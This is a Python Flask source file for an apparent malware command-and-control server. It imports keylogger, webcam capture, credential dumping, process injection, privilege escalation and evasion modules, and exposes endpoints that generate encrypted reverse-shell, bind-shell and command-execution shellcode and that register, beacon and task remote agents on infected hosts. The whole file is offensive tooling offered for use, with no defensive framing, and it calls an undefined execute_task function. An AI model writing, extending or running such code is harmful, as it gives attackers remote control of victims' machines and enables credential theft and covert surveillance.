#!/usr/bin/env python
import sys
import os
import platform
import time
import json
import base64
import logging
from datetime import datetime
import threading

from flask import Flask, render_template, request, jsonify

# Fix: Add correct module path BEFORE importing
MODULES_PATH = os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'agent', 'modules'))
sys.path.append(MODULES_PATH)

from shellcode_generator import ShellcodeGenerator
from dns_tunnel import DNSTunnel

IS_WINDOWS = platform.system().lower() == "windows"
if IS_WINDOWS:
    from evasion import Evasion
    from keylogger import Keylogger
    from webcam import WebcamCapture
    from process_injection import ProcessInjector
    from credential_dump import CredentialDump
    from priv_esc import PrivilegeEscalation
    from post_exploit import PostExploit

# Logging setup
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

app = Flask(__name__)

shellcode_gen = ShellcodeGenerator()
dns_tunnel = DNSTunnel("example.com")

if IS_WINDOWS:
    evasion = Evasion()
    keylogger = Keylogger()
    webcam = WebcamCapture()
    process_injector = ProcessInjector()
    post_exploit = PostExploit()
    cred_dump = CredentialDump()
    priv_esc = PrivilegeEscalation()

agents = {}
tasks = {}
results = {}

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/shellcode')
def shellcode():
    return render_template('shellcode.html')

@app.route('/api/generate_shellcode', methods=['POST'])
def generate_shellcode():
    try:
        data = request.get_json()
        shellcode_type = data.get('type')
        platform = data.get('platform', 'windows')
        encoding = data.get('encoding', 'base64')
        encryption = data.get('encryption', 'none')
        key = data.get('key', '')
        shellcode = None

        # Generate shellcode
        if shellcode_type == 'reverse':
            host = data.get('host')
            port = int(data.get('port', 0))
            if not host or not port:
                return jsonify({'success': False, 'error': 'Host and port are required'}), 400
            shellcode = shellcode_gen.generate_reverse_shell(host, port, platform)

        elif shellcode_type == 'bind':
            port = int(data.get('port', 0))
            if not port:
                return jsonify({'success': False, 'error': 'Port is required'}), 400
            shellcode = shellcode_gen.generate_bind_shell(port, platform)

        elif shellcode_type == 'exec':
            command = data.get('command')
            if not command:
                return jsonify({'success': False, 'error': 'Command is required'}), 400
            shellcode = shellcode_gen.generate_exec(command, platform)

        else:
            return jsonify({'success': False, 'error': 'Invalid shellcode type specified'}), 400

        # ✅ Immediately check if shellcode generation failed
        if shellcode is None:
            return jsonify({'success': False, 'error': 'Shellcode generation failed. Please verify msfvenom installation.'}), 500

        # Apply Encryption
        if encryption == 'xor':
            shellcode = shellcode_gen.xor_encrypt(shellcode, key or "defaultxor")
            if shellcode is None:
                return jsonify({'success': False, 'error': 'XOR encryption failed'}), 500

        elif encryption == 'aes':
            shellcode = shellcode_gen.aes_encrypt(shellcode, key or "defaultaes")
            if shellcode is None:
                return jsonify({'success': False, 'error': 'AES encryption failed'}), 500

        # Encoding
        encoded = shellcode_gen.encode_shellcode(shellcode, encoding)
        if encoded is None:
            return jsonify({'success': False, 'error': 'Encoding failed'}), 500

        return jsonify({
            'success': True,
            'shellcode': encoded.decode() if isinstance(encoded, bytes) else encoded
        })

    except Exception as e:
        return jsonify({'success': False, 'error': f'Unexpected server error: {str(e)}'}), 500

@app.route('/api/agents', methods=['GET'])
def list_agents():
    return jsonify(list(agents.values()))

@app.route('/api/agents/register', methods=['POST'])
def register_agent():
    try:
        wrapper = request.get_json()
        encoded_data = wrapper.get('data')
        if not encoded_data:
            return jsonify({'status': 'error', 'message': 'Missing data'}), 400

        decoded_json = base64.b64decode(encoded_data).decode()
        data = json.loads(decoded_json)
        agent_id = data.get('agent_id')

        if agent_id:
            if agent_id in agents:
                # Update existing agent
                agents[agent_id].update(data)
                agents[agent_id]['last_seen'] = datetime.now().isoformat()
            else:
                # Register new agent
                agents[agent_id] = data
                agents[agent_id]['last_seen'] = datetime.now().isoformat()
                agents[agent_id]['results'] = {}

            logging.info(f"Registered agent: {agent_id}")
            return jsonify({'status': 'success'})

        return jsonify({'status': 'error', 'message': 'Missing agent_id'}), 400

    except Exception as e:
        logging.error(f"Registration error: {str(e)}")
        return jsonify({'status': 'error'}), 500

@app.route('/api/agents/beacon', methods=['POST'])
def agent_beacon():
    try:
        wrapper = request.get_json()
        encoded_data = wrapper.get('data')

        if not encoded_data:
            return jsonify({'status': 'error', 'message': 'Missing data'}), 400

        decoded_json = base64.b64decode(encoded_data).decode()
        data = json.loads(decoded_json)
        agent_id = data.get('agent_id')
        timestamp = datetime.now().isoformat()

        if agent_id:
            if agent_id in agents:
                agents[agent_id]['last_seen'] = timestamp
            else:
                agents[agent_id] = {
                    'agent_id': agent_id,
                    'system_info': data.get('system_info'),
                    'status': data.get('status'),
                    'last_seen': timestamp,
                    'results': {}
                }

            logging.info(f"Beacon received from {agent_id}")
            return jsonify({'status': 'ok', 'message': 'Beacon received'})

        return jsonify({'status': 'error', 'message': 'Missing agent_id'}), 400

    except Exception as e:
        logging.error(f"Beacon error: {str(e)}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/tasks/<agent_id>', methods=['GET'])
def get_tasks(agent_id):
    return jsonify(tasks.get(agent_id, []))

@app.route('/api/tasks', methods=['POST'])
def create_task():
    data = request.get_json()
    agent_id = data.get('agent_id')
    task_type = data.get('type')
    task_data = data.get('data', {})

    if not agent_id or not task_type:
        return jsonify({'status': 'error'}), 400

    task_id = f"task_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
    task = {
        'id': task_id,
        'type': task_type,
        'data': task_data,
        'status': 'pending',
        'timestamp': datetime.now().isoformat()
    }

    if agent_id not in tasks:
        tasks[agent_id] = []
    tasks[agent_id].append(task)

    thread = threading.Thread(
        target=execute_task,
        args=(agent_id, task_id, task_type, task_data),
        daemon=True
    )
    thread.start()

    return jsonify({'task_id': task_id})

# Add execute_task and result endpoints if not present above

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5001)